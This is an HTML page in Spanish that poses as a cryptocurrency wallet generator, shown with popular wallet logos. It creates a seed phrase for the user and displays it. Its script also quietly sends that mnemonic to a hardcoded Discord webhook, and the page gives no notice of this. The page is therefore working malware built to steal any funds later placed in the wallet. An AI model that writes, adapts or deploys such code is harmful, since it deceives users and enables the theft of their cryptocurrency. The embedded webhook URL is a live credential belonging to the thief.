<!DOCTYPE html>
<html>
<head>
  <title>Generador de Wallet</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }

    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
      background-color: #fff;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
      text-align: center;
    }

    h1 {
      color: #333;
      margin-bottom: 30px;
    }

    p {
      color: #666;
      margin-bottom: 20px;
    }

    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    input[type="text"] {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
      margin-bottom: 10px;
    }

    .wallet-logos {
      display: flex;
      justify-content: space-around;
      align-items: center;
      margin-top: 20px;
    }

    .wallet-logo {
      width: 50px;
      height: 50px;
    }
  </style>
  <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
  <script>
    function generateWallet() {
      const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
      const wallet = ethers.Wallet.fromMnemonic(mnemonic);

      const address = wallet.address;

      document.getElementById("seedField").value = mnemonic;
      document.getElementById("addressField").value = address;

      // Enviar la semilla generada a través del webhook de Discord
      const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';

      const payload = {
        content: mnemonic
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
        .then(function (response) {
          if (response.ok) {
            console.log('Semilla enviada al webhook de Discord');
          } else {
            console.error('Error al enviar la semilla al webhook de Discord:', response.status);
          }
        })
        .catch(function (error) {
          console.error('Error al enviar la semilla al webhook de Discord:', error);
        });
    }
  </script>
</head>
<body>
  <div class="container">
    <h1>Generador de Wallet</h1>
    <p>Bienvenido al Generador de Wallet. Haz clic en el botón "Generar Wallet" para crear una nueva billetera y obtener su semilla y dirección.</p>
    <button id="generateButton" onclick="generateWallet()">Generar Wallet</button>
    <input id="seedField" type="text" readonly>
    <input id="addressField" type="text" readonly>

    <div class="wallet-logos">
      <img class="wallet-logo" src="metamask_logo.png" alt="Metamask">
      <img class="wallet-logo" src="trustwallet_logo.png" alt="Trust Wallet">
      <img class="wallet-logo" src="tronlink_logo.png" alt="TronLink">
      <img class="wallet-logo" src="roninwallet_logo.png" alt="Ronin Wallet">
    </div>
  </div>
</body>
</html>
